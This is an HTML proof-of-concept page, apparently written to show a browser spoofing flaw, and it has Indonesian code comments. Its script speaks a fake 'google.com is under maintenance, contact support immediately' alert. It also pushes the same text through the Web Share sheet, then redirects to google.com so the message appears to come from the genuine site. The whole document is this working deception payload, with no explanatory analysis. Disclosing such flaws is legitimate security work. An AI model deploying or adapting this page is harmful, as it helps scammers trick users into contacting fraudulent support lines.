<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SpeechSynthesis Redirect PoC (Controlled)</title>
<style>
  body {
    font-family: Arial, sans-serif;
    text-align: center;
    padding: 60px;
  }
  button {
    padding: 15px 30px;
    font-size: 20px;
    cursor: pointer;
  }
  #status {
    margin-top: 20px;
    font-size: 18px;
    color: darkred;
  }
</style>
</head>
<body>

<h2>CLICK TO GOOGLE</h2>
<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
<div id="status">Status: Waiting...</div>

<script>
const btn = document.getElementById('speechBtn');
const status = document.getElementById('status');

btn.addEventListener('click', () => {

  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";

  if (!('speechSynthesis' in window)) {
    status.textContent = "SpeechSynthesis not supported.";
    return;
  }

  const utter = new SpeechSynthesisUtterance(text);
  utter.lang = 'en-US';

  const voices = speechSynthesis.getVoices();
  const enVoice = voices.find(v => v.lang.startsWith('en'));
  if (enVoice) utter.voice = enVoice;

  status.textContent = "Preparing redirect...";

  // Redirect cepat
  setTimeout(() => {

    // Trigger speech tepat sebelum navigasi
    speechSynthesis.speak(utter);
    console.log("[PoC] Speech triggered");

    // Web Share API (dijalankan hanya jika perangkat mendukung)
    if (navigator.share) {
      navigator.share({
        title: 'Google Maintenance Alert',
        text: 'Attention: google.com is currently under maintenance. Please contact support immediately.',
        url: 'https://google.com'
      }).then(() => {
        console.log('[PoC] Web Share API triggered');
      }).catch((error) => {
        console.error('[PoC] Web Share API error:', error);
      });
    }

    // Navigasi langsung setelah speech dipanggil
    setTimeout(() => {
      window.location.replace('https://google.com');
    }, 1000); // Delay agar web share dapat diproses lebih dahulu

  }, 300); // delay kecil (bisa tweak 100–500ms untuk testing)

});
</script>

</body>
</html>
